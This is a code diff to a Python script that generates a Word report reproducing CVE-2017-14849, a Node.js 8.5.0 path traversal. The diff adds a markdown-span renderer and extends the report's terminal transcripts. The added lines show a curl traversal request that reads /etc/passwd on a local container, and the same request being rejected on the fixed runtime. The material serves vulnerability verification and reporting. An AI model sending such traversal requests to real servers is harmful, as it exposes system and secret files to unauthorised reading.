@@ -34,6 +34,34 @@ def shade(pPr, fill="F4F6FA"):
     pPr.insert(0, el)
 
 
+def md_runs(p, text, size=11, bold=False, color=None, italic=False):
+    """Render **bold** and `code` spans inside a paragraph."""
+    i = 0
+    while i < len(text):
+        if text.startswith("**", i):
+            j = text.find("**", i + 2)
+            if j == -1:
+                set_run(p.add_run(text[i:]), size=size, bold=bold, color=color, italic=italic)
+                return
+            set_run(p.add_run(text[i + 2:j]), size=size, bold=True, color=color, italic=italic)
+            i = j + 2
+            continue
+        if text[i] == "`":
+            j = text.find("`", i + 1)
+            if j == -1:
+                set_run(p.add_run(text[i:]), size=size, bold=bold, color=color, italic=italic)
+                return
+            set_run(p.add_run(text[i + 1:j]), font=MONO, size=size - 0.8,
+                    bold=bold, color=color, italic=italic)
+            i = j + 1
+            continue
+        j = i
+        while j < len(text) and text[j] != "`" and not text.startswith("**", j):
+            j += 1
+        set_run(p.add_run(text[i:j]), size=size, bold=bold, color=color, italic=italic)
+        i = j
+
+
 def para(doc, text="", size=11, bold=False, align=WD_ALIGN_PARAGRAPH.JUSTIFY,
          sa=8, sb=0, line=1.34, color=None, italic=False):
     p = doc.add_paragraph()
@@ -42,7 +70,7 @@ def para(doc, text="", size=11, bold=False, align=WD_ALIGN_PARAGRAPH.JUSTIFY,
     pf = p.paragraph_format
     pf.space_before, pf.space_after, pf.line_spacing = Pt(sb), Pt(sa), line
     if text:
-        set_run(p.add_run(text), size=size, bold=bold, color=color, italic=italic)
+        md_runs(p, text, size=size, bold=bold, color=color, italic=italic)
     return p
 
 
@@ -423,8 +451,14 @@ code(doc, [
     "",
     "$ curl --path-as-is -s 'http://127.0.0.1:3000/static/../foo/../../secret.txt'",
     "SECRET_FLAG{this-file-lives-outside-the-static-root}",
+    "",
+    "# the request printed in the vulhub README: a system file instead",
+    "$ curl --path-as-is -s \\",
+    "       'http://127.0.0.1:3000/static/../../../a/../../../../etc/passwd'",
+    "root:x:0:0:root:/root:/bin/bash",
 ])
-caption(doc, "Terminal transcript: the traversal succeeds inside the container running Node 8.5.0.")
+caption(doc, "Terminal transcript: the traversal succeeds inside the container running Node 8.5.0, "
+             "on a mounted file and on a system file that was never part of the image.")
 para(doc, "Both runs were executed by `cve/CVE-2017-14849/verify-docker.ps1`, which builds each "
           "image, waits until the application actually answers HTTP 200, issues the requests and "
           "writes the whole session to `cve/CVE-2017-14849/docker-evidence.txt` in the repository. "
@@ -440,11 +474,14 @@ code(doc, [
     "$ curl --path-as-is -s -o /dev/null -w '%{http_code}' \\",
     "       http://127.0.0.1:3000/static/../foo/../../secret.txt",
     "404",
+    "$ curl --path-as-is -s -o /dev/null -w '%{http_code}' \\",
+    "       'http://127.0.0.1:3000/static/../../../a/../../../../etc/passwd'",
+    "404",
     "$ curl --path-as-is -s -o /dev/null -w '%{http_code}' http://127.0.0.1:3000/static/main.js",
     "200",
 ])
-caption(doc, "Terminal transcript: identical request, fixed runtime — rejected, and normal "
-             "requests are still served. Full transcript in evidence/shot-docker and docker-evidence.txt.")
+caption(doc, "Terminal transcript: both traversal requests are rejected on the fixed runtime, and "
+             "normal requests are still served. Full transcript in docker-evidence.txt.")
 para(doc, "Before Docker was available on this machine the same result was obtained natively, by "
           "running the official Node.js 8.5.0 build directly; that path is kept in the repository "
           "as a fallback because it needs no container runtime at all.", sb=4)
